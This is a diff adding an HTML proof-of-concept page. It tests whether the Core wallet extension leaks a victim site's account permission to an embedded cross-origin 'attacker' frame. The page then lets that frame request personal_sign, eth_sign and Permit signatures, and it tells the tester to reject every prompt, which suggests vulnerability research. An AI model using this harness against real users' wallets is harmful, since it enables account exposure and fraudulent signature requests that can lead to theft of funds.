@@ -1,0 +1,49 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>cross frame permission test</title>
+<style>
+html,body{background:#fff;color:#111}body{max-width:720px;margin:24px auto;padding:0 18px;font:17px/1.5 system-ui}button{display:block;width:100%;margin:9px 0;padding:14px;background:#fff;color:#111;border:2px solid #111;border-radius:6px;text-align:left;font:700 16px system-ui}button:disabled{color:#777;border-color:#aaa}.result{padding:13px;border:3px solid #555;font-weight:800}pre{padding:14px;border:2px solid #555;font:14px/1.45 ui-monospace,monospace;white-space:pre-wrap;overflow-wrap:anywhere}iframe{width:100%;height:72px;border:2px solid #555}
+</style>
+<h2>Cross frame permission</h2>
+<p>Victim A: <b id="a"></b><br>Attacker B: <b id="b"></b></p>
+<p>Reject every signing prompt</p>
+<button id="connect">1. Connect A through Core Extension</button>
+<button id="accounts" disabled>2. B requests eth_accounts through its own Core provider</button>
+<button id="personal" disabled>3. B requests personal_sign -> REJECT if prompted</button>
+<button id="blind" disabled>4. B requests eth_sign -> REJECT if prompted</button>
+<button id="permit" disabled>5. B requests dummy Permit -> REJECT if prompted</button>
+<p id="result" class="result" hidden></p>
+<pre id="log">load...</pre>
+<iframe id="frame"></iframe>
+<script>
+'use strict';
+const ATTACKER='https://azza1231.github.io/pocpoc/attacker-extension.html';
+const $=id=>document.getElementById(id),frame=$('frame'),bOrigin=new URL(ATTACKER).origin;
+let account='',chainId='',ready=false;
+$('a').textContent=location.origin;$('b').textContent=bOrigin;
+const write=value=>$('log').textContent+='\n'+value;
+const show=value=>{$('result').hidden=false;$('result').textContent=value};
+const isAddress=value=>/^0x[0-9a-fA-F]{40}$/.test(value);
+function send(type){if(ready)frame.contentWindow.postMessage({type,account,chainId},bOrigin)}
+addEventListener('message',event=>{
+  if(event.source!==frame.contentWindow||event.origin!==bOrigin)return;
+  const data=event.data||{};
+  if(data.type==='READY'){
+    ready=data.actualOrigin===bOrigin&&data.victimOrigin===location.origin&&data.isSubframe===true&&data.coreProvider===true;
+    $('accounts').disabled=!(ready&&isAddress(account));
+    $('log').textContent=`Browser-authenticated B: ${event.origin}\nVictim A: ${location.origin}\nCross-origin subframe: ${data.isSubframe}\nCore provider in B: ${data.coreProvider}\nStrict proof: ${ready}`;
+  }
+  if(data.type==='RESULT'){
+    write(`\nB RESULT ${data.method}\n${JSON.stringify(data,null,2)}`);
+    if(data.method==='eth_accounts'){
+      const leaked=Array.isArray(data.value)&&data.value.some(x=>x.toLowerCase()===account.toLowerCase());
+      show(leaked?'VULNERABLE: B received A account permission.':'SECURE CONTROL: B did not receive A account permission.');
+      $('personal').disabled=$('blind').disabled=$('permit').disabled=false;
+    }else if(data.error?.code===4001)show(`SIGNING FLOW REACHED for B: ${data.method}. Verify the origin shown by Core, then keep it rejected.`);
+  }
+});
+const child=new URL(ATTACKER);child.searchParams.set('victimOrigin',location.origin);child.searchParams.set('v',Date.now());frame.src=child.href;
+$('connect').onclick=async()=>{try{if(!window.avalanche?.request)throw Error('Core Extension provider unavailable');const accounts=await window.avalanche.request({method:'eth_requestAccounts'});account=accounts?.[0]||'';chainId=await window.avalanche.request({method:'eth_chainId'});if(!isAddress(account))throw Error('No account');write(`\nA CONNECTED\naccount: ${account}\nchainId: ${chainId}`);$('connect').disabled=true;$('accounts').disabled=!ready}catch(error){write('CONNECT ERROR: '+(error?.message||error))}};
+$('accounts').onclick=()=>send('ACCOUNTS');$('personal').onclick=()=>send('PERSONAL');$('blind').onclick=()=>send('BLIND');$('permit').onclick=()=>send('PERMIT');
+</script>
